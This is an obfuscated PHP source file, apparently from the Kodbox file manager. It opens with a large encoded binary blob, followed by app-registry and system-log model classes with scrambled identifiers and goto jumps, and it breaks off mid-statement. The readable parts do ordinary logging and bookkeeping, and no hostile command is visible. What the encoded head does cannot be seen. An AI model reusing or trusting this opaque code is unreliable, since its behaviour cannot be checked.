ˆ%®*w¡ĞéÄ¦`ºbÀı½†Àé?ÔÜIö!İ9¦]Û‘ºÁN| G¼‚ò')."\x3b\xb\x26\xbb\x2d\x1e\xe8\xc8\xb\xd0\xc2\xc7\xac\x39\x74\xec\xbb\x4b\x7c\xdf\x1a\x65\xe1\x75\xe2\x8e\xf9\x0\x48\xc3\x6f\x4a\xb\x8d\xe4\xce\xa1\xf0\x23\x10\xd4\xab\xa0\x2b\x1e\x2f\x5\x87\x34\x6\x2c\x77\x30\xe5\x60"."\xfe\x10\x89\x13\x62\xb0\xf5\xc\x7a\xfd\x3\x35\xb5\x50\x62\xb2\xb8\x17\xe8\x9f\x62\x6e\x62\xc1\xa8\xa0\x35\xb9\x9f\xbe\xc0\x63\x88\x11\x9a\xca\x68\xce\xb0\x44\xb0\x4f\x34\x4b\x6e\x6\x62\x58\x93\x4a\x94\xb1\x60\xc2\x14"."\xfb\x6\x9d\xc\xd4\x45\xbb\x89\xbd\x10\x40\xcc\x91\xa1\x4f\x66\xb1\x50\x3f\x91\x3f\x27\xb1\x9d\x13\xe1\x8b\xad\xcc\x3f\x1c\xdd\xde\x4c\x66\xd4\x98\xe4\xf3\xf7\xc2\x5d\xb7\xdb\x1b\x5c\x21\x25\x15\x53\xe2\x42\xd\xba\x85"."\260\316\142\344\356\1\35\347\121\42\216\262\27\315\141\320\216\216\76\354\242\13\30\203\355\70\104\377\161\62\173\227\136\50\30\217\272\130\34\74\67\261\307\231\11\153\11\56\25\2\312\162\210\337\27"."\xf2\xc0\x1d\x8b\x75\xde\x23\x30\xd9\xcb\x58\xcb\x99\x52\xe0\xd\x40\xe5\x6f\xe7\x2b\x7c\x97\xe0\xa7\xf9\xa9\x89\x90\x41\xcd\x16\x54\x43\xe5\x53\x9a\x76\xd5\x94\x88\x5f\xd6\x97\xa8\x29\x2\x2\x74\xed\xc3\x8d\xb8\x35\xbd".strrev('*ÉüØ2Hœ×–Ø'."\n".'8öw[±G.\\®¬è'."\0".'ÊL7Ã›Yœ)yXø†2Èq<Æöe;ô')._kodDe('K3GYCQ/3ZbCvlHB9jLYe1kmc74WZm70dZKUTXtoO49DTjDdFuvEaL30MbDD6tngXEBOVFAPjYJ8=').base64_decode('C1VAeD48gu6OyUzDrluJQMJ8K0Xwkyg46iyVitEr3djQiDGhNRknPX9k7mrhMbSnSKruMGkIgg==').strrev('s·Ã•!Ã1İFÔtÕ`(\\T»Rg·iÇ.TE”È©hàĞÇÏ£¾(}õ)‘¹').base64_decode('PJmcabFn7lMN7lYdSQt8VwRFMC0zVQawGMz7aDWYB0NocZJNaGLLEGfzAA5iQyFsJ22DR9nmYA==').base64_decode('6QP1JPuMZdnqbRWWAwv3tzBSFBGIDFmqCv6J6S8cMSZvwjoJggmxbgqTX8ozS4sGg9RNNEkodQ==').base64_decode('wmhZYr/CVddIXW18GcDX0wAE2AOy3hHInaYJdIBV2APYg5oD+6ygckhSZW4TLWhkLoAtAz9NLA==')."\xf1\x5\x43\xd6\x43\xec\x17\x26\x9f\xf5\x62\x17\x25\x16\xa8\x2e\x88\xdb\xa2\xe7\x4c\xec\x61\x86\x3b\x16\x26\xe8\xe0\x6b\x83\xd8\x2b\xe\x99\xad\x62\x91\xd4\xf9\x10\xfa\x81\x2\x39\x20\x5c\x66\xf0\xec\x2c\x77\x56\x4\x3d".strrev('$­Çä£Ø;ô0'."\n".'J…¨eUBŠ•'."\r".'‹Ò~HPH¦âtIµ ‚aåëT×H{ƒq1¼')."\230\70\11\343\174\337\41\372\241\247\115\300\204\121\366\15\364\13\67\325\66\334\106\33\43\27\325\360\41\225\104\43\210\5\62\33\367\15\155\303\247\370\310\360\205\163\11\336\35\224\354\223\12\377\40"."\xac\x61\x48\xfc\xb8\x45\xf2\x2b\x15\xfa\x58\x2f\x95\x64\x8\x94\xf6\x64\x48\x2b\xf7\x92\xc0\xbd\x33\x65\xf3\x19\xee\xd9\xa\x44\xac\x2\x2f\x16\xf5\xa9\x7f\x89\x6f\x68\x6e\x5e\x4f\xdb\x90\x3a\xad\x8d\xbe\xd4\x64\xc3\xaf".base64_decode('CdosRaAKRUyhwUz6Khmuso99h9KJ2x0kAANRwmUEFH4avCYTb2xatFTc8/Gu5+5mcA11ISM5oA==')."\47\312\73\364\300\213\15\257\144\245\26\211\76\66\47\316\117\224\150\165\356\111\236\12\24\170\131\11\27\372\116\104\355\252\44\144\342\114\302\271\24\53\71\307\131\177\245\257\374\377\353\141\365\226\106"."\166\167\156\46\131\12\342\240\50\270\362\332\343\327\311\276\373\367\251\114\46\133\75\147\241\124\353\4\26\16\23\24\323\17\315\332\311\230\10\62\76\177\212\104\130\245\140\131\56\121\160\55\27\274\51"."\375\163\35\105\344\220\232\173\300\100\104\142\41\30\246\315\246\133\334\74\243\202\102\250\221\63\25\215\166\176\244\276\204\142\320\345\70\362\106\347\352\145\56\272\341\305\41\257\2\214\361\311\156\152\74"."\305\24\174\112\103\366\340\247\147\141\140\353\150\221\32\101\234\333\33\11\164\37\57\1\212\53\271\60\263\0\175\253\202\344\107\304\37\56\106\240\206\12\76\172\310\346\224\367\224\213\114\230\270\115\174".base64_decode('RxFEGaEQvkxmHnL0iT8rcGHOcHlogKrkw4hwzIKkMpaYEgU2+KqGVTRhtUBPUlWiWVwJSIhkKQ==').base64_decode('QEHVwG5xoM4uMpWFeUjvWWcqatA3rCewOOZolkREb9fCeoU/icG7iamEsmyWGIlwQQlpQAs3NQ==')."\x28\xce\x5c\x7b\xd3\x27\x52\xe8\xcb\x29\x32\x73\xc8\x2\x3d\xcd\xb0\xad\xb\x3e\xc9\x21\x28\xe9\x34\x77\x2\x24\xbe\xb\x90\x8e\xca\xba\x3\x50\xd8\xb8\xa9\xd1\x47\x71\x2b\x44\xca\x5b\x9\xd7\x69\x1c\xaf\x20\x6d\x67\xd5"."\330\170\5\137\74\260\367\241\106\214\300\61\321\75\371\14\150\234\243\264\266\105\231\46\33\15\361\307\45\111\265\4\17\176\345\16\215\272\4\341\61\110\74\32\225\361\5\106\332\42\36\347\235\70\16".base64_decode('n6+07sPEr+FLTFirANwCOGYgjMr0pxr4QEuUikFIrDsl4EFdQ6uaFco2KoLBjaACEyxlAaZm6Q==')."\x5\x20\x4a\xa\x87\xc9\xf8\xa9\x2e\xfc\x88\x2b\x7c\x67\x8\x30\x2\x29\x38\xd4\x5f\x83\xdc\xdf\x42\x0\xf2\x2c\x83\x9e\x7b\x59\x47\x16\xd9\x75\xd2\x2c\x49\xf8\xf\x3f\xfa\x53\x3\x93\x61\x21\xeb\x24\xef\x0\x7f\x82\xb1"."\126\342\217\325\210\117\323\302\323\230\36\215\121\233\325\165\267\41\27\300\46\130\67\102\152\316\230\51\135\240\56\341\335\217\225\320\333\60\155\46\244\10\226\207\222\217\360\14\263\265\120\60\256\101\323"."\x32\x2\xfc\x8d\xdb\xd2\xb7\x6d\xd1\x56\x3\xef\x1e\x2c\x9b\x8\xa2\x58\x22\x82\x84\xb3\x10\xa8\x24\x6d\xdd\x5a\xa3\x44\x4\xa6\xf\x76\x91\x12\x84\x33\x5c\xeb\x69\x3a\x7b\x61\xb4\x6c\x76\xe7\x55\x9f\x90\x8c\x72\x51\x8f"."\x89\xe0\x17\xfa\xec\xf6\x72\x47\x3\x28\x19\x9f\x4a\xb9\xa\x32\xd3\xb5\x28\xcd\x35\x64\x91\xea\x84\xb3\xf7\x18\xa2\x37\x2e\x2e\xa3\x8c\x51\x50\x4b\xf4\x8f\x2b\xa7\x96\xe6\x30\x53\xaa\x1e\xef\x52\xb3\xf1\x52\xfc\x7c\x36"."\xca\xa0\x1c\x1d\xc\x46\x57\x25\x30\x90\x32\x2a\x30\xb8\x84\x5c\xe0\x27\xb4\x5c\x76\x8a\xc7\x7b\xe4\x42\x5\x54\x66\xfc\xcb\xa0\x0\xc2\x50\x91\x60\x20\xbc\x1b\xc0\x5d\xdb\x2a\x93\x22\xbf\x27\x78\x89\xf2\xea\x40\xc4\x72"."\x28\x7f\x57\xa0\xb4\x55\x68\x2e\x30\x38\x39\x14\xcf\xa\x8e\xbf\x8\x51\x71\x10\x7e\xee\x98\x79\x76\xc3\x45\xe9\x1a\xca\x28\xc7\xb9\xcb\x37\x5c\x47\xb6\x59\xe1\x9f\xb4\x3e\x7f\xc0\xd0\x98\xd0\x2\x70\x90\xf2\xb4\xdd\x2"."\x2d\x71\xce\xb\xf\x70\xe8\xca\x53\x92\x44\x76\x4a\x42\xf1\x15\x37\x54\x96\x1\xf7\x9\xc5\x89\xe7\xf2\x33\x66\x8\x56\xfe\x8\xa7\x4a\x6b\x17\x7\x4b\x6e\x3\x4a\xd8\x22\x47\x26\xb2\xa4\xa5\x64\xb\xd3\x64\x8d\x25\x98"."\1\61\321\122\305\322\341\106\2\61\247\125\14\314\240\323\24\234\346\262\46\141\174\245\244\105\142\206\322\326\342\34\172\131\237\221\74\225\77\135\372\1\332\145\245\267\136\274\20\341\154\251\354\112\56"."\xa4\x55\xc8\x83\x6b\x54\x31\x1b\x4e\x82\x39\xb9\x54\x63\xc9\x2b\xee\xfd\x78\x36\xf8\x82\xb7\x31\x43\xd\xcb\xdb\x8f\x66\x47\x49\xeb\x49\x9d\xb9\x67\x6b\x1\x75\xa6\x2e\xa9\x88\x5c\xfe\x39\x32\xfe\xa5\xd8\x68\x3f\x57\xb9"."\x16\x15\xf7\x9e\x33\xd5\xa2\x22\xf2\x8c\xb5\xe0\xd8\x25\x17\x6c\x95\xd8\x1c\x4d\xa9\xc0\xd8\xf8\x7d\x58\x39\xb\xe5\x69\x15\x6e\xe7\x70\x99\x70\x15\xd\x58\x94\xd1\xca\x92\xc5\xab\xbe\xca\x97\x81\x81\x8a\x13\xd1\xb0\xde"."\322\225\300\305\216\241\152\5\133\217\73\366\315\333\117\361\16\112\64\40\202\55\214\67\237\35\317\122\237\76\340\13\334\123\42\373\12\225\306\112\134\301\122\212\314\346\5\367\243\45\276\144\241\62\63".strrev('ÃHŞGÄ;9(ËÆ>³7CÜZõ}-?t…O•Ë0[²â/…MŠåºq`NŠ>}ÂcWq°33¡')."\x82\x40\xba\xa6\xe0\x16\xc0\x86\x57\x27\x9c\x1c\xd4\x74\x13\x5a\x25\x3\xe\x9a\x43\xbf\x5d\x9a\x69\xd2\x89\xd\xe4\x4b\x84\x89\x44\x2a\xe4\xf4\x44\xb8\xef\x3\x21\x49\x16\xfc\xe7\xea\xe8\xd8\x12\x91\x16\x62\x1\x28\x48".base64_decode('Dt/hZimo4FTEViwReBzKIuIKMq7Fo1qRjBB6cYB/je925FKhiLu6J1Qh3k0ihR/DiVOcRFvYjg==').strrev('pEÂ\\£%–+€şÃƒtK,0ojÏZığDâ‡øä	S~!Î„GÉr˜§\'“°Ê')."\x59\xd2\x60\x9f\x7f\x60\xa6\x34\x4f\xbf\xcb\xeb\x2b\x4b\x83\x17\xc3\x50\xed\x91\x3e\x7f\x86\x93\xbc\x83\xa8\x96\x2e\x9f\x8f\x6a\x19\x95\xd7\xc2\xdb\xbd\x82\xd7\x4\xdd\x6f\xf0\x73\xbc\x5c\x4a\xcb\xa\x54\x2a\x68\x40\xd0".base64_decode('w8ugTHWzITOmk0MMKxl2aCIUZ92/ikNu0Lf2WCBXJrcLCy+8yB0ghQWovz8iRuOLVbeoQQ5fOw==')."\145\263\233\311\235\250\331\242\56\10\176\354\131\110\304\113\273\345\156\110\200\243\311\3\17\221\154\2\331\212\53\47\2\20\75\306\222\263\371\222\56\347\41\141\275\56\277\347\101\20\336\201\260\65\207"."\x50\x5f\x1\x63\x5a\x54\x38\x39\xc4\x5d\x61\xe9\x4\xf1\xea\x1e\x87\x2d\xc9\x80\xeb\x84\xb4\x90\x9c\x24\x5c\x6\xa\x6\x3c\xd6\x35\x25\x86\xc5\x53\x8b\xe\xc6\x64\x4c\x39\x49\x6f\x62\x4b\x4f\xad\x84\x6b\x46\xd8\x5f\xff"."\x7\x9e\x92\xca\xc6\x2a\xbc\x0\x0"."".""."", 10, -8))); goto cĞêÔ‡¬ÉŸ; BœÅ¹­õ’†: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\56\x4c\151\147\150\164\x41\x70\160"; public $modelType = "\x53\x79\x73\164\x65\x6d\x4f\160\164\151\x6f\x6e"; public $field = array("\156\141\155\145", "\x67\x72\157\165\160", "\144\x65\163\x63", "\x63\x6f\x6e\164\x65\156\164"); public function listData($A±Š‚‡ö± = false, $bğÀ¦‘ÊÌ = "\155\x6f\x64\151\146\171\x54\151\155\145", $Aºß´×Ó¢ = true) { return parent::listData($A±Š‚‡ö±, $bğÀ¦‘ÊÌ, $Aºß´×Ó¢); } public function remove($c†ôËÓö–) { $AõõÇò”ŞØ = $this->findByName($c†ôËÓö–); if (!$AõõÇò”ŞØ) { return !1; } return parent::remove($AõõÇò”ŞØ[$_SERVER[¿õñ][364]]); } public function add($b³»‹¸¡”ª) { if ($this->findByName($b³»‹¸¡”ª[$_SERVER[¿õñ][28]])) { return !1; } return parent::insert($b³»‹¸¡”ª); } public function update($c°ôŒôõ¿á, $EÁòÑààÌ¸) { $A°Àò„ÏÁ =& $_SERVER[¿õñ]; $F¯£›ˆß‰ = $this->findByName($c°ôŒôõ¿á); $FéäÄ—¯™© = $this->findByName($EÁòÑààÌ¸[$A°Àò„ÏÁ[28]]); if (!$F¯£›ˆß‰ || $FéäÄ—¯™© && $FéäÄ—¯™©[$A°Àò„ÏÁ[364]] != $F¯£›ˆß‰[$A°Àò„ÏÁ[364]]) { return !1; } return parent::update($F¯£›ˆß‰[$A°Àò„ÏÁ[364]], $EÁòÑààÌ¸); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\145\x6d\x5f\x6c\x6f\147"; protected $dataAuto = array(array("\143\x72\145\x61\x74\145\x54\151\x6d\145", "\164\x69\155\145", "\x69\x6e\x73\145\162\x74", "\146\165\x6e\x63\x74\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $F½±ö¦¾“ö =& $_SERVER[¿õñ]; return array($F½±ö¦¾“ö[2267] => LNG($F½±ö¦¾“ö[2268]), $F½±ö¦¾“ö[2269] => LNG($F½±ö¦¾“ö[2270]), $F½±ö¦¾“ö[1954] => LNG($F½±ö¦¾“ö[2271]), $F½±ö¦¾“ö[2272] => LNG($F½±ö¦¾“ö[2273]), $F½±ö¦¾“ö[2274] => LNG($F½±ö¦¾“ö[2275]), $F½±ö¦¾“ö[2276] => LNG($F½±ö¦¾“ö[2277]), $F½±ö¦¾“ö[2278] => LNG($F½±ö¦¾“ö[2279]), $F½±ö¦¾“ö[2280] => LNG($F½±ö¦¾“ö[2281]), $F½±ö¦¾“ö[1985] => LNG($F½±ö¦¾“ö[2282]), $F½±ö¦¾“ö[2283] => LNG($F½±ö¦¾“ö[2284]), $F½±ö¦¾“ö[2285] => LNG($F½±ö¦¾“ö[2286]), $F½±ö¦¾“ö[2287] => LNG($F½±ö¦¾“ö[2288]), $F½±ö¦¾“ö[2289] => LNG($F½±ö¦¾“ö[2290]), $F½±ö¦¾“ö[1983] => LNG($F½±ö¦¾“ö[2291]), $F½±ö¦¾“ö[1988] => LNG($F½±ö¦¾“ö[2292]), $F½±ö¦¾“ö[2293] => LNG($F½±ö¦¾“ö[2294]), $F½±ö¦¾“ö[2295] => LNG($F½±ö¦¾“ö[2296]), $F½±ö¦¾“ö[2297] => LNG($F½±ö¦¾“ö[2298]), $F½±ö¦¾“ö[2299] => LNG($F½±ö¦¾“ö[2300]), $F½±ö¦¾“ö[1991] => LNG($F½±ö¦¾“ö[2301]), $F½±ö¦¾“ö[1992] => LNG($F½±ö¦¾“ö[2302]), $F½±ö¦¾“ö[2303] => LNG($F½±ö¦¾“ö[2304]), $F½±ö¦¾“ö[2305] => LNG($F½±ö¦¾“ö[2306]), $F½±ö¦¾“ö[2307] => LNG($F½±ö¦¾“ö[2308]), $F½±ö¦¾“ö[2309] => LNG($F½±ö¦¾“ö[2310]), $F½±ö¦¾“ö[2311] => LNG($F½±ö¦¾“ö[2312]), $F½±ö¦¾“ö[1986] => LNG($F½±ö¦¾“ö[2313]), $F½±ö¦¾“ö[2314] => LNG($F½±ö¦¾“ö[2315]), $F½±ö¦¾“ö[2316] => LNG($F½±ö¦¾“ö[2317]), $F½±ö¦¾“ö[2318] => LNG($F½±ö¦¾“ö[2318]), $F½±ö¦¾“ö[2319] => LNG($F½±ö¦¾“ö[1958]), $F½±ö¦¾“ö[2320] => LNG($F½±ö¦¾“ö[2321]), $F½±ö¦¾“ö[2322] => LNG($F½±ö¦¾“ö[2323]), $F½±ö¦¾“ö[2324] => LNG($F½±ö¦¾“ö[2325]), $F½±ö¦¾“ö[2326] => LNG($F½±ö¦¾“ö[2327]), $F½±ö¦¾“ö[2328] => LNG($F½±ö¦¾“ö[2328]), $F½±ö¦¾“ö[2329] => LNG($F½±ö¦¾“ö[2330]), $F½±ö¦¾“ö[2331] => LNG($F½±ö¦¾“ö[2332]), $F½±ö¦¾“ö[2333] => LNG($F½±ö¦¾“ö[2334]), $F½±ö¦¾“ö[2335] => LNG($F½±ö¦¾“ö[2336]), $F½±ö¦¾“ö[2337] => LNG($F½±ö¦¾“ö[2338]), $F½±ö¦¾“ö[2339] => LNG($F½±ö¦¾“ö[2340])); } private function typeFile() { $F¦ç†ÕËã§ =& $_SERVER[¿õñ]; $E÷õîÊï‹œ = array($F¦ç†ÕËã§[1988] => array($F¦ç†ÕËã§[1989]), $F¦ç†ÕËã§[2287] => array($F¦ç†ÕËã§[2341]), $F¦ç†ÕËã§[2289] => array($F¦ç†ÕËã§[2342]), $F¦ç†ÕËã§[1983] => array($F¦ç†ÕËã§[1984]), $F¦ç†ÕËã§[2295] => array(), $F¦ç†ÕËã§[2297] => array(), $F¦ç†ÕËã§[2299] => array(), $F¦ç†ÕËã§[1991] => array($F¦ç†ÕËã§[1993]), $F¦ç†ÕËã§[1992] => array($F¦ç†ÕËã§[1993]), $F¦ç†ÕËã§[2303] => array($F¦ç†ÕËã§[2343]), $F¦ç†ÕËã§[2305] => array($F¦ç†ÕËã§[2343]), $F¦ç†ÕËã§[2307] => array($F¦ç†ÕËã§[2344]), $F¦ç†ÕËã§[2293] => array($F¦ç†ÕËã§[2345]), $F¦ç†ÕËã§[2309] => array($F¦ç†ÕËã§[2346]), $F¦ç†ÕËã§[2311] => array($F¦ç†ÕËã§[2347]), $F¦ç†ÕËã§[1986] => array($F¦ç†ÕËã§[1987])); return $E÷õîÊï‹œ; } private function typeAll() { goto aîº÷ô‘õË; D¬ã†á²ğõ: foreach ($aÜ‘¯˜Ñ¡Æ as $dá•Å„Êµù => $BõˆÒ²‘í) { $Bóäöâ’ËÇ[$BõˆÒ²‘í[0]] = $Bóäöâ’ËÇ[$dá•Å„Êµù]; } $Bóäöâ’ËÇ[$FÄà’•àÁÙ[1993]] = LNG($FÄà’•àÁÙ[2348]); $Bóäöâ’ËÇ[$FÄà’•àÁÙ[2343]] = LNG($FÄà’•àÁÙ[2349]); goto D½öÄïŞÜ®; D½öÄïŞÜ®: return $Bóäöâ’ËÇ; goto FÍ×â‹ò¬; aîº÷ô‘õË: $FÄà’•àÁÙ =& $_SERVER[¿õñ]; $Bóäöâ’ËÇ = $this->typeList; $aÜ‘¯˜Ñ¡Æ = array_filter($this->typeFile()); goto D¬ã†á²ğõ; FÍ×â‹ò¬: } public function addLog($BíÈö¶ìß, $f¯Œ–‹ï¸Ï = array()) { goto aØ˜ŒÖ‘; FöË©èºí£: $fèƒ©ï°˜ = get_client_ip(); if (!$f¯Œ–‹ï¸Ï || strlen(json_encode($f¯Œ–‹ï¸Ï)) >= 1024) { $f¯Œ–‹ï¸Ï = array($bŸ½ñÏîî‚[2350] => $fèƒ©ï°˜); } else { if (is_array($f¯Œ–‹ï¸Ï)) { $f¯Œ–‹ï¸Ï[$bŸ½ñÏîî‚[2350]] = $fèƒ©ï°˜; } else { $f¯Œ–‹ï¸Ï = array($bŸ½ñÏîî‚[1019] => $f¯Œ–‹ï¸Ï, $bŸ½ñÏîî‚[2350] => $fèƒ©ï°˜); } } $f¯Œ–‹ï¸Ï = array($bŸ½ñÏîî‚[1340] => Session::sign(), $bŸ½ñÏîî‚[1341] => $b¦Å™ƒò†ƒ, $bŸ½ñÏîî‚[29] => $BíÈö¶ìß, $bŸ½ñÏîî‚[1343] => json_encode($f¯Œ–‹ï¸Ï)); goto Dæßº¼Ë±; aØ˜ŒÖ‘: $bŸ½ñÏîî‚ =& $_SERVER[¿õñ]; if (!isset($this->typeList[$BíÈö¶ìß])) { return; } $b¦Å™ƒò†ƒ = USER_ID ? USER_ID : (isset($f¯Œ–‹ï¸Ï[$bŸ½ñÏîî‚[1350]]) ? $f¯Œ–‹ï¸Ï[$bŸ½ñÏîî‚[1350]] : 0); goto FöË©èºí£; Dæßº¼Ë±: parent::add($f¯Œ–‹ï¸Ï); goto BŸëó°ìÇĞ; BŸëó°ìÇĞ: } public function remove($b·§é„Ùó) { $this->where(array($_SERVER[¿õñ][382] => $b·§é„Ùó))->delete(); } private function _makeOrder($f£ŸŸ«™‚ = '') { goto e•Ç†ÉÈ´; e•Ç†ÉÈ´: $b÷ê‹º„ù =& $_SERVER[¿õñ]; $a¹µ¯Á‚ = $b÷ê‹º„ù[184]; $få‘Ü·Êµì = array($b÷ê‹º„ù[398] => $b÷ê‹º„ù[399], $b÷ê‹º„ù[400] => $b÷ê‹º„ù[401]); goto Cİîö¨‡äÌ; Cİîö¨‡äÌ: $Cì‰ÈóøÆ = Input::get($b÷ê‹º„ù[404], $b÷ê‹º„ù[7], $b÷ê‹º„ù[2150], array($b÷ê‹º„ù[2091], $b÷ê‹º„ù[400])); $Cì‰ÈóøÆ = $få‘Ü·Êµì[$Cì‰ÈóøÆ]; $f£ŸŸ«™‚ = $f£ŸŸ«™‚ . "{$a¹µ¯Á‚}\40{$Cì‰ÈóøÆ}"; goto AØ…ßÉ ‡ø; AØ…ßÉ ‡ø: return $this->order($f£ŸŸ«™‚); goto E†ôÔ­¯ù; E†ôÔ­¯ù: } public function get($d½‡†¬Ä…µ = '') { goto cÑ°Èçˆõ’; cÑ°Èçˆõ’: $A²ğÈˆâÆ– =& $_SERVER[¿õñ]; if (!$d½‡†¬Ä…µ) { show_json(array()); } $AíŞ…–ëï = array(); goto EÇ¯ïóİ‰Ã; EÇ¯ïóİ‰Ã: if ($d½‡†¬Ä…µ[$A²ğÈˆâÆ–[1350]]) { $AíŞ…–ëï[$A²ğÈˆâÆ–[1350]] = $d½‡†¬Ä…µ[$A²ğÈˆâÆ–[1350]]; } if (isset($d½‡†¬Ä…µ[$A²ğÈˆâÆ–[699]])) { $aœËºî»±Ï = $d½‡†¬Ä…µ[$A²ğÈˆâÆ–[699]]; $E‚øÍÇŒéš = isset($d½‡†¬Ä…µ[$A²ğÈˆâÆ–[700]]) ? $d½‡†¬Ä…µ[$A²ğÈˆâÆ–[700]] : time(); $AíŞ…–ëï[$A²ğÈˆâÆ–[184]] = array($A²ğÈˆâÆ–[318], array($aœËºî»±Ï, $E‚øÍÇŒéš)); } if ($d½‡†¬Ä…µ[$A²ğÈˆâÆ–[29]]) { $b¬‹ä¾“²½ = explode($A²ğÈˆâÆ–[47], $d½‡†¬Ä…µ[$A²ğÈˆâÆ–[29]]); $C•Œ®¦‹ºÇ = $this->typeFile(); $fÏ¹…¨ÂÄ© = array(); foreach ($b¬‹ä¾“²½ as $e…åÚíóÈ·) { $fÏ¹…¨ÂÄ©[] = $e…åÚíóÈ·; if (isset($C•Œ®¦‹ºÇ[$e…åÚíóÈ·])) { $fÏ¹…¨ÂÄ© = array_merge($fÏ¹…¨ÂÄ©, $C•Œ®¦‹ºÇ[$e…åÚíóÈ·]); } } $fÏ¹…¨ÂÄ© = array_unique($fÏ¹…¨ÂÄ©); if ($fÏ¹…¨ÂÄ©) { $AíŞ…–ëï[$A²ğÈˆâÆ–[29]] = array($A²ğÈˆâÆ–[7], $fÏ¹…¨ÂÄ©); } } goto A¯°ëõîíØ; e§İÍ÷­ßó: $Dò•¤ Ä[$A²ğÈˆâÆ–[350]] = $this->logList($Dò•¤ Ä[$A²ğÈˆâÆ–[350]]); return $Dò•¤ Ä; goto f­œ—â„¼Ç; A¯°ëõîíØ: if (!empty($d½‡†¬Ä…µ[$A²ğÈˆâÆ–[2350]])) { $AíŞ…–ëï[$A²ğÈˆâÆ–[401]] = array($A²ğÈˆâÆ–[758], "\x25{$d½‡†¬Ä…µ[$A²ğÈˆâÆ–[2350]]}\x25"); } $Dò•¤ Ä = $this->_makeOrder()->where($AíŞ…–ëï)->selectPage(); if (empty($Dò•¤ Ä[$A²ğÈˆâÆ–[350]])) { show_json(array(), !0, $Dò•¤ Ä[$A²ğÈˆâÆ–[347]]); } goto e§İÍ÷­ßó; f­œ—â„¼Ç: } private function ipAddress(&$A±¨¤ğêãë) { $DèïŞ¯‰é =& $_SERVER[¿õñ]; if (!empty($A±¨¤ğêãë[$DèïŞ¯‰é[2350]])) { $céÏîëÃå” = IpLocation::get($A±¨¤ğêãë[$DèïŞ¯‰é[2350]]); if ($céÏîëÃå” == $DèïŞ¯‰é[2351]) { $céÏîëÃå” = $DèïŞ¯‰é[2352]; } } else { $céÏîëÃå” = LNG($DèïŞ¯‰é[2353]); } $A±¨¤ğêãë[$DèïŞ¯‰é[2354]] = $céÏîëÃå”; } private function getSourceList(&$fĞƒ´ˆ•æ…) { $BÂô¸¥ÈÜ‡ =& $_SERVER[¿õñ]; $déôâ…óï = array(); foreach ($fĞƒ´ˆ•æ… as $d¢¶¼ŒÌÇ’ => $b·ğêëªœ‰) { $d„˜àé‡ó = json_decode($b·ğêëªœ‰[$BÂô¸¥ÈÜ‡[401]], !0); if (strpos($b·ğêëªœ‰[$BÂô¸¥ÈÜ‡[29]], $BÂô¸¥ÈÜ‡[2185]) !== 0) { goto Bñ»ó±Ü¥; eÂ˜éÒ”©ç: $déôâ…óï[] = $d„˜àé‡ó[$BÂô¸¥ÈÜ‡[366]] = $c¥Ê¾æå¨»[$BÂô¸¥ÈÜ‡[366]]; $déôâ…óï[] = $d„˜àé‡ó[$BÂô¸¥ÈÜ‡[2184]] = $c¥Ê¾æå¨»[$BÂô¸¥ÈÜ‡[457]]; $fĞƒ´ˆ•æ…[$d¢¶¼ŒÌÇ’][$BÂô¸¥ÈÜ‡[401]] = json_encode($d„˜àé‡ó); goto e©Øª¡ËÎ¦; e©Øª¡ËÎ¦: continue; goto aÛ†›ĞğÏÒ; Bñ»ó±Ü¥: if (!isset($d„˜àé‡ó[$BÂô¸¥ÈÜ‡[76]]) || strpos($b·ğêëªœ‰[$BÂô¸¥ÈÜ‡[29]], $BÂô¸¥ÈÜ‡[2355]) !== 0) { continue; } if (!IO::init($d„˜àé‡ó[$BÂô¸¥ÈÜ‡[76]])) { continue; } if (!($c¥Ê¾æå¨» = IO::infoFull($d„˜àé‡ó[$BÂô¸¥ÈÜ‡[76]]))) { continue; } goto eÂ˜éÒ”©ç; aÛ†›ĞğÏÒ: } $déôâ…óï[] = $d„˜àé‡ó[$BÂô¸¥ÈÜ‡[366]]; $déôâ…óï[] = $d„˜àé‡ó[$BÂô¸¥ÈÜ‡[2184]]; if ($d„˜àé‡ó[$BÂô¸¥ÈÜ‡[29]] == $BÂô¸¥ÈÜ‡[484]) { $déôâ…óï[] = $d„˜àé‡ó[$BÂô¸¥ÈÜ‡[401]][$BÂô¸¥ÈÜ‡[990]]; $déôâ…óï[] = $d„˜àé‡ó[$BÂô¸¥ÈÜ‡[401]][$BÂô¸¥ÈÜ‡[991]]; } if ($d„˜àé‡ó[$BÂô¸¥ÈÜ‡[29]] == $BÂô¸¥ÈÜ‡[2192]) { $déôâ…óï[] = $d„˜àé‡ó[$BÂô¸¥ÈÜ‡[401]][$BÂô¸¥ÈÜ‡[366]]; } } if (!$déôâ…óï) { return array(); } return Model($BÂô¸¥ÈÜ‡[759])->sourceListInfo($déôâ…óï, !0); } private function logList($BæÉ‚‚‹ Û) { goto FÉ¼ïõÁ¬; d«Å£‰§®ğ: $eŠ÷¸¦’†Œ = array(); foreach ($BæÉ‚‚‹ Û as $cÀ£‹éˆÊâ => $C×Ò©ÕÅÑ) { goto BŠğÒ½îìÛ; BŠğÒ½îìÛ: $AË¥¼ŠÅÂ» = $C×Ò©ÕÅÑ[$a¦²Íó±¡ª[29]]; $A‘ÀêáÑÅõ = isset($aäí¡–¾´…[$C×Ò©ÕÅÑ[$a¦²Íó±¡ª[1350]]]) ? $aäí¡–¾´…[$C×Ò©ÕÅÑ[$a¦²Íó±¡ª[1350]]] : !1; $bºØÁĞ­‹Š = strpos($AË¥¼ŠÅÂ», $a¦²Íó±¡ª[2356]) == 0 ? LNG($a¦²Íó±¡ª[2357]) : LNG($a¦²Íó±¡ª[2353]); goto EßÑ¬×î; eÌõÚ™ñ£³: $this->ipAddress($C×Ò©ÕÅÑ); if (strpos($AË¥¼ŠÅÂ», $a¦²Íó±¡ª[2185]) === 0 || isset($DâñÅ¯®·É[$a¦²Íó±¡ª[2184]])) { goto BåÇƒ´âÛâ; BåÇƒ´âÛâ: $DâñÅ¯®·É[$a¦²Íó±¡ª[388]] = $E‘œêàÅ´š[$DâñÅ¯®·É[$a¦²Íó±¡ª[366]]]; $DâñÅ¯®·É[$a¦²Íó±¡ª[2197]] = $E‘œêàÅ´š[$DâñÅ¯®·É[$a¦²Íó±¡ª[2184]]]; if ($DâñÅ¯®·É[$a¦²Íó±¡ª[29]] == $a¦²Íó±¡ª[484]) { $DâñÅ¯®·É[$a¦²Íó±¡ª[401]][$a¦²Íó±¡ª[990]] = 